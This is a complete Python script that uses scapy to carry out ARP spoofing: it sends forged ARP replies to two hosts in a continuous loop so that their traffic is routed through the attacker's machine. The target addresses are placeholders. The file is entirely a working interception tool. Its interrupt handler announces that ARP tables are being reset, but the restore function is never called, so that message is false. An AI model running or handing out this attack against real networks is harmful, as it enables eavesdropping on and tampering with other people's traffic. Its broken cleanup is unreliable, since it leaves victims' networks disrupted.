import scapy.all as scapy
import time
import sys

#beautify. For appearance purposes only
def banner_text(text, screen_width = 70):
    if len(text) > screen_width - 4:
        raise ValueError("String {0} is larger then specified width {1}"
                         .format(text, screen_width))

    if text == "*":
        print("*" * screen_width)
    else:
        centred_text = text.center(screen_width - 4)
        output_string = "**{0}**".format(centred_text)
        print(output_string)

#create arp request to find mac address from ip
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


if __name__ == "__main__":
    try:
        packets_sent_count = 0
        while True:
            spoof("xx:xx:xx:xx","yy:yy:yy:yy")
            spoof("yy:yy:yy:yy","xx:xx:xx:xx")
            packets_sent_count = packets_sent_count + 2
            print("\r[+] Sent " + str(packets_sent_count), flush=True),
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C, Resetting ARP tables...One Sec.\n")
